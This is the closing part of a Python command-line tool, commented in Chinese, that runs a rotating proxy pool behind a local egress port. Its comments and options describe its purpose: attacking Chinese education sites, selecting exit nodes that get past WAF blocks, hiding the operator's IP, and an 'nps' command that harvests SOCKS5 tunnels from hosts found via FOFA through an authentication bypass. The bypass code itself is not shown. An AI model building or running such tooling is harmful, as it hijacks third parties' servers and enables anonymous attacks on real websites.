            if len(u) > 255 or len(p) > 255:
                return False
            sock.sendall(b"\x01" + bytes([len(u)]) + u + bytes([len(p)]) + p)
            resp = sock.recv(2)
            if len(resp) < 2 or resp[1] != 0:
                return False
        elif resp[1] != 0:
            return False
        hb = str(host).encode("idna")
        if not hb or len(hb) > 255:
            return False
        sock.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + int(port).to_bytes(2, "big"))
        resp = sock.recv(10)
        if len(resp) < 2 or resp[1] != 0:
            return False
        sock.settimeout(30)
        return True
    except Exception:
        return False


def _tunnel_pair(src, dst, bufsize=65536):
    """双向转发两个已连接 socket。"""
    socks = [src, dst]
    while True:
        r, _, x = select.select(socks, [], socks, 60)
        if x or not r:
            break
        for s in r:
            other = dst if s is src else src
            try:
                data = s.recv(bufsize)
            except Exception:
                return
            if not data:
                return
            try:
                other.sendall(data)
            except Exception:
                return


class _ProxyHandler(socketserver.BaseRequestHandler):
    """把客户端请求通过池中代理转发出去；失败自动换下一个重试。"""

    CRLF = chr(13) + chr(10)
    HDR_END = chr(13) + chr(10) + chr(13) + chr(10)

    def handle(self):
        client = self.request
        client.settimeout(30)
        try:
            head = b""
            while self.HDR_END.encode() not in head and len(head) < 65536:
                chunk = client.recv(4096)
                if not chunk:
                    return
                head += chunk
            if not head:
                return
            first_line = head.split(self.CRLF.encode(), 1)[0].decode("latin-1", "ignore")
            parts = first_line.split()
            if len(parts) < 2:
                client.sendall(self._resp(400, b"Bad Request"))
                return

            method, target = parts[0].upper(), parts[1]
            pool = []
            for tier in _pool_tiers(self.server.entry_port):
                tier = filter_pool(tier)
                random.shuffle(tier)
                pool.extend(tier)
            if not pool:
                # 无可用代理（池空或全在拉黑期）：直连兜底（保证统一入口永不失效）
                _log_direct(target)
                self._direct(client, head, method, target)
                return

            tried = 0
            for proxy in pool[: self.server.max_tries]:
                tried += 1
                scheme, p_host, p_port, p_user, p_pw = parse_entry(proxy)
                if not p_host or not p_port:
                    blacklist_add(proxy)
                    continue
                upstream = _open_upstream(p_host, p_port)
                if upstream is None:
                    blacklist_add(proxy)
                    continue
                try:
                    if method == "CONNECT":
                        host, _, port_s = target.rpartition(":")
                        port = int(port_s or 443)
                        if scheme == "socks5":
                            if not _socks5_handshake(upstream, host or target, port, p_user, p_pw):
                                upstream.close()
                                blacklist_add(proxy)
                                continue
                        else:
                            upstream.sendall(("CONNECT " + target + " HTTP/1.1" + self.CRLF
                                              + "Host: " + target + self.HDR_END).encode())
                            resp = upstream.recv(256)
                            if b" 200 " not in resp.split(self.CRLF.encode())[0]:
                                upstream.close()
                                blacklist_add(proxy)
                                continue
                        client.sendall(("HTTP/1.1 200 Connection Established"
                                       + self.HDR_END).encode())
                        blacklist_clear(proxy)
                        _tunnel_pair(client, upstream)
                        return
                    else:
                        rest = head.split(self.HDR_END.encode(), 1)[1] if self.HDR_END.encode() in head else b""
                        lines = head.split(self.HDR_END.encode(), 1)[0].split(self.CRLF.encode())
                        if scheme == "socks5":
                            # socks5 是透明 TCP 隧道：把绝对形式请求改回 origin-form 直发
                            u = urllib.parse.urlsplit(target)
                            path = (u.path or "/") + (("?" + u.query) if u.query else "")
                            lines = [l for l in lines if not l.lower().startswith(b"proxy-connection")]
                            lines[0] = (method + " " + path + " HTTP/1.1").encode()
                            if not any(l.lower().startswith(b"host:") for l in lines):
                                lines.insert(1, b"Host: " + u.netloc.encode())
                            thost = u.hostname or target
                            tport = u.port or (443 if u.scheme == "https" else 80)
                            if not _socks5_handshake(upstream, thost, tport, p_user, p_pw):
                                upstream.close()
                                blacklist_add(proxy)
                                continue
                        else:
                            lines[0] = (method + " " + target + " HTTP/1.1").encode()
                        payload = self.CRLF.encode().join(lines) + self.HDR_END.encode() + rest
                        upstream.sendall(payload)
                        while True:
                            data = upstream.recv(65536)
                            if not data:
                                break
                            client.sendall(data)
                        upstream.close()
                        blacklist_clear(proxy)
                        return
                except Exception:
                    try:
                        upstream.close()
                    except Exception:
                        pass
                    blacklist_add(proxy)
                    continue
            # 池内全挂：直连兜底
            _log_direct(target, extra=f"{tried} 个代理全挂，")
            self._direct(client, head, method, target)
        except Exception:
            pass

    def _direct(self, client, head, method, target):
        """直连兜底：池空/全挂时保证请求仍能出去（不换 IP，但至少可用）。"""
        try:
            import urllib.parse as _up
            m = method if isinstance(method, str) else method.decode()
            if m.upper() == "CONNECT":
                host, _, port = target.rpartition(":")
                up = socket.create_connection((host, int(port or 443)), timeout=15)
                up.settimeout(30)
                client.sendall(("HTTP/1.1 200 Connection Established"
                                + self.HDR_END).encode())
                _tunnel_pair(client, up)
                return
            else:
                u = _up.urlsplit(target)
                port = u.port or (443 if u.scheme == "https" else 80)
                up = socket.create_connection((u.hostname, port), timeout=15)
                up.settimeout(30)
                rest = head.split(self.HDR_END.encode(), 1)[1] if self.HDR_END.encode() in head else b""
                lines = head.split(self.HDR_END.encode(), 1)[0].split(self.CRLF.encode())
                lines = [l for l in lines if not l.lower().startswith(b"proxy-connection")]
                payload = self.CRLF.encode().join(lines) + self.HDR_END.encode() + rest
                up.sendall(payload)
                while True:
                    data = up.recv(65536)
                    if not data:
                        break
                    client.sendall(data)
                up.close()
        except Exception:
            try:
                client.sendall(self._resp(502, b"Bad Gateway",
                                          extra=b"X-Pool-Error: direct fallback failed"))
            except Exception:
                pass

    @classmethod
    def _resp(cls, code, reason, extra=b""):
        return (("HTTP/1.1 " + str(code) + " " + reason.decode() + cls.CRLF).encode()
                + extra + cls.HDR_END.encode() + cls.HDR_END.encode())

    def log_message(self, *a):
        pass


class ThreadedProxyServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def _raw_http_via(via, entry, url, timeout=12):
    """经 via（可空）→ entry（http/socks5 代理）→ url（仅 http）取响应字节；失败 None。
    池子巡检/校验的通用管道：不给对方留本机 IP。"""
    u = urllib.parse.urlsplit(url)
    if u.scheme != "http" or not u.hostname:
        return None
    host, port = u.hostname, u.port or 80
    path = (u.path or "/") + (("?" + u.query) if u.query else "")
    scheme, e_host, e_port, e_user, e_pw = parse_entry(entry)
    if not e_host or not e_port:
        return None
    if via:
        s = _via_socket(via, e_host, e_port, timeout=timeout)
    else:
        try:
            s = socket.create_connection((e_host, e_port), timeout=8)
        except Exception:
            s = None
    if s is None:
        return None
    try:
        s.settimeout(15)
        ua = random.choice(UA_POOL)
        if scheme == "socks5":
            if not _socks5_handshake(s, host, port, e_user, e_pw):
                return None
            req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                   f"User-Agent: {ua}\r\nConnection: close\r\n\r\n").encode()
        else:
            req = (f"GET {url} HTTP/1.1\r\nHost: {u.netloc}\r\n"
                   f"User-Agent: {ua}\r\nConnection: close\r\n\r\n").encode()
        s.sendall(req)
        buf = b""
        while len(buf) < 65536:
            try:
                d = s.recv(8192)
            except Exception:
                break
            if not d:
                break
            buf += d
        return buf or None
    except Exception:
        return None
    finally:
        try:
            s.close()
        except Exception:
            pass


def _http_status(buf):
    try:
        return int(buf.split(b"\r\n", 1)[0].split()[1])
    except Exception:
        return None


def _watch_once(entry_port, watch_url, timeout=6, workers=20, via=None):
    """复验当前池条目并重写来源文件（死条剔除、存活解禁）；存活不足 3 条时
    从 nps 源候选（nps_raw.txt）复验补池——对端 npc 重新上线后自动回归。
    via 设置时条目经 via 复验（http CONNECT / socks5），不给对方留本机 IP。
    返回 (检查数, 存活数)。"""
    pf = None
    for f in (POOL_DIR / f"ok_{entry_port}.txt", OK_FILE):
        if f.exists():
            pf = f
            break
    if pf is None:
        return 0, 0
    fallback_warned = []

    def _ok(p):
        if via:
            buf = _raw_http_via(via, p, watch_url)
            st = _http_status(buf) if buf else None
            if st is not None:
                return st < 500
            if not fallback_warned:
                fallback_warned.append(1)
                print(f"[watch] via 不可用，本轮直连复验: {p}", file=sys.stderr, flush=True)
        return check_one(p, watch_url, timeout, False) is not None

    rows = load_file(pf)
    alive = []
    if rows:
        with cf.ThreadPoolExecutor(max_workers=workers) as ex:
            for p, ok in zip(rows, ex.map(_ok, rows)):
                if ok:
                    alive.append(p)
    for p in alive:
        blacklist_clear(p)
    if len(alive) < 3:
        cand = [p for p in load_file(NPS_RAW_FILE) if p not in set(alive)]
        if cand:
            cand = cand[:25]
            with cf.ThreadPoolExecutor(max_workers=workers) as ex:
                for p, ok in zip(cand, ex.map(_ok, cand)):
                    if ok:
                        alive.append(p)
                        blacklist_clear(p)
    if alive != rows:
        pf.write_text("\n".join(alive), encoding="utf-8")
    return len(rows), len(alive)


def serve(port=LOCAL_PORT, entry_port=10001, max_tries=6, block=True, watch=120, watch_url=WATCH_URL,
          auto_harvest=0, auto_via=None):
    """起本地统一入口。entry_port 决定优先用哪个 ok 池（默认 10001）；
    watch>0 内置存活巡检（默认 120s）；auto_harvest>0 时池子见底自动补采（经 auto_via 出网）。"""
    srv = ThreadedProxyServer((LOCAL_HOST, port), _ProxyHandler)
    srv.entry_port = entry_port
    srv.max_tries = max_tries
    pool = _pool_for(entry_port)
    paid = load_file(PAID_FILE)
    print(f"[*] 统一出口入口已启动:  http://{LOCAL_HOST}:{port}")
    print(f"    用法:  curl -x http://{LOCAL_HOST}:{port} <目标URL>")
    print(f"    上游池: {len(pool)} 个活代理（其中付费 {len(paid)} 个），失败自动轮转")
    print(f"    存活巡检: {'每 %ds 复验池条目' % watch if watch > 0 else '关闭'}"
          f"（via={auto_via or '直连'}）；使用期失败拉黑 {BLACK_TTL}s")
    if auto_harvest > 0:
        print(f"    自动补采: 存活<3 时跑 nps 采集 {auto_harvest} 台")
    if not pool:
        print("[!] 池为空——先跑 check 验证："
              f"  python yuk1_proxy.py check https://<轻量目标>/")
    if watch > 0:
        def _loop():
            while True:
                time.sleep(watch)
                try:
                    b, a = _watch_once(entry_port, watch_url, via=auto_via)
                    if b:
                        print(f"[watch] 巡检 {b} -> {a} 活", flush=True)
                    if a < 3 and auto_harvest > 0:
                        print(f"[watch] 池子见底（{a} 活），自动补采 {auto_harvest} 台"
                              f"（via={auto_via or '直连'}）...", flush=True)
                        nps_harvest(probe=auto_harvest, skip_fofa=True, via=auto_via)
                        b2, a2 = _watch_once(entry_port, watch_url, via=auto_via)
                        print(f"[watch] 补采后 {b2} -> {a2} 活", flush=True)
                except Exception as e:
                    print(f"[watch] err {type(e).__name__}", flush=True)
        threading.Thread(target=_loop, daemon=True).start()
    if not block:
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        return srv
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 入口已停止")
        srv.shutdown()


# ══════════════════════════════════════════════════════════════════
# 直连出枪 / 诊断
# ══════════════════════════════════════════════════════════════════
def shoot(url, method, data, headers, rows=8, pool_file=None):
    """不经 serve，直接从池里轮转出枪（调试用）。"""
    pool = filter_pool(load_file(pool_file) if pool_file else load_ok())
    if not pool:
        print("[!] 池为空或全在拉黑期，先跑 check")
        return None
    random.shuffle(pool)
    hdrs = {"User-Agent": UA}
    for h in headers or []:
        k, _, v = h.partition(":")
        hdrs[k.strip()] = v.strip()
    for p in pool[:rows]:
        try:
            t0 = time.time()
            s = _session()
            s.proxies.update(entry_to_proxies(p))
            r = s.request(method, url, data=data, headers=hdrs, timeout=(4, 12))
            print(f"[{p}] {r.status_code} {len(r.content)}B {time.time()-t0:.1f}s")
            print("---- body head ----")
            print(r.text[:800])
            return r
        except Exception as e:
            blacklist_add(p)
            print(f"[{p}] {type(e).__name__}", flush=True)
    print("[-] all tried proxies failed; re-run check")
    return None


def load_ok():
    return load_file(OK_FILE)


def doctor(url="https://ip-api.com/json/?lang=zh-CN"):
    """一键诊断：本机出口归属 + 池子规模 + 直连对目标连通性。"""
    print("=" * 60)
    print("[1] 本机直连出口")
    try:
        r = _session().get("http://ip-api.com/json/?lang=zh-CN", timeout=8)
        d = r.json()
        print(f"    IP: {d.get('query')}")
        print(f"    归属: {d.get('country')} {d.get('regionName')} {d.get('city')}")
        print(f"    ISP: {d.get('isp')} / {d.get('org')}")
        cn = d.get("countryCode") == "CN"
        print(f"    国内出口: {'✅ 是（打 edu 最优，无需代理）' if cn else '⚠ 否（edu 站可能 RST）'}")
    except Exception as e:
        print(f"    查询失败: {type(e).__name__}")
    print("[2] 代理池")
    paid = load_file(PAID_FILE)
    print(f"    付费代理(paid.txt): {len(paid)} 个" + (" ← 打 edu 用这个" if paid else " ⚠ 未配置"))
    print(f"    已验活(ok.txt):     {len(load_ok())} 个")
    print(f"    已验活中国(cn_ok):  {len(load_file(CN_OK_FILE))} 个")
    print(f"    原始池(raw.txt):    {len(load_file(RAW_FILE))} 个")
    print(f"    nps源(nps_raw.txt): {len(load_file(NPS_RAW_FILE))} 个 socks5")
    print("[3] 入口")
    try:
        s = socket.create_connection((LOCAL_HOST, LOCAL_PORT), timeout=2)
        s.close()
        print(f"    ✅ {LOCAL_HOST}:{LOCAL_PORT} 正在监听")
    except Exception:
        print(f"    ⚠ {LOCAL_HOST}:{LOCAL_PORT} 未启动"
              f"（python yuk1_proxy.py serve --port {LOCAL_PORT}）")
    print("=" * 60)


def main():
    ap = argparse.ArgumentParser(description="代理池 + 本地统一出口入口 127.0.0.1:10001")
    sub = ap.add_subparsers(dest="cmd", required=True)

    sv = sub.add_parser("serve", help="起本地统一出口入口（推荐）")
    sv.add_argument("--port", type=int, default=LOCAL_PORT)
    sv.add_argument("--entry-port", type=int, default=10001, help="用哪个 ok 池（10001=默认）")
    sv.add_argument("--tries", type=int, default=6, help="单请求最多试几个上游代理")
    sv.add_argument("--watch", type=int, default=120, help="存活巡检间隔秒（0=关闭，默认120）")
    sv.add_argument("--watch-url", default=WATCH_URL, help="巡检用轻量 URL")
    sv.add_argument("--auto-harvest", type=int, default=0, help="池子见底自动补采的探测台数（0=关）")
    sv.add_argument("--auto-via", default=None, help="巡检/自动补采的出口（ip:port / socks5h://…，不留本机 IP）")

    fe = sub.add_parser("fetch", help="拉源落盘")
    fe.add_argument("--cn", action="store_true", help="只拉并过滤中国源")

    ck = sub.add_parser("check", help="对目标验证代理")
    ck.add_argument("url")
    ck.add_argument("--limit", type=int, default=40)
    ck.add_argument("--timeout", type=int, default=6)
    ck.add_argument("--workers", type=int, default=30)
    ck.add_argument("--cn-only", action="store_true", help="只要中国出口（打国内 edu 用）")
    ck.add_argument("--waf", action="store_true", help="把 WAF 拦截页（403/429/验证码页等）视为验活失败（找真能打该目标的出口）")
    ck.add_argument("--port", type=int, default=10001, help="同时写 ok_{port}.txt 供 serve 用")

    ge = sub.add_parser("get", help="不经 serve 直接轮转出枪")
    ge.add_argument("url")
    ge.add_argument("-X", dest="method", default="GET")
    ge.add_argument("-d", dest="data")
    ge.add_argument("-H", dest="headers", action="append")
    ge.add_argument("--rows", type=int, default=8)

    sub.add_parser("doctor", help="诊断出口归属与池子状态")

    np = sub.add_parser("nps", help="nps 源：鉴权绕过采集 socks5 隧道并验证入池")
    np.add_argument("--fofa-size", type=int, default=10000)
    np.add_argument("--probe", type=int, default=500, help="本轮探测的候选主机数")
    np.add_argument("--workers", type=int, default=60)
    np.add_argument("--ep-cap", type=int, default=400, help="端到端验证上限")
    np.add_argument("--all", action="store_true", help="保留非 CN 出口（默认只收 CN）")
    np.add_argument("--skip-fofa", action="store_true", help="跳过 FOFA 拉取，复用已落盘候选")
    np.add_argument("--via", default=None,
                    help="采集链出口（ip:port / http://ip:port / socks5h://…）：扫描流量经它出网，不留本机 IP")

    a = ap.parse_args()
    if a.cmd == "serve":
        serve(a.port, a.entry_port, a.tries, True, a.watch, a.watch_url, a.auto_harvest, a.auto_via)
    elif a.cmd == "fetch":
        fetch_sources(cn_only=a.cn)
    elif a.cmd == "check":
        ok = check(a.url, a.limit, a.timeout, a.workers, a.cn_only, waf=a.waf)
        if a.port and ok:
            (POOL_DIR / f"ok_{a.port}.txt").write_text("\n".join(ok), encoding="utf-8")
            print(f"[*] 已写 ok_{a.port}.txt（serve --entry-port {a.port} 用）")
    elif a.cmd == "get":
        shoot(a.url, a.method, a.data, a.headers, a.rows)
    elif a.cmd == "doctor":
        doctor()
    elif a.cmd == "nps":
        nps_harvest(a.fofa_size, a.probe, a.workers, a.ep_cap, a.all, a.skip_fofa, a.via)


if __name__ == "__main__":
    main()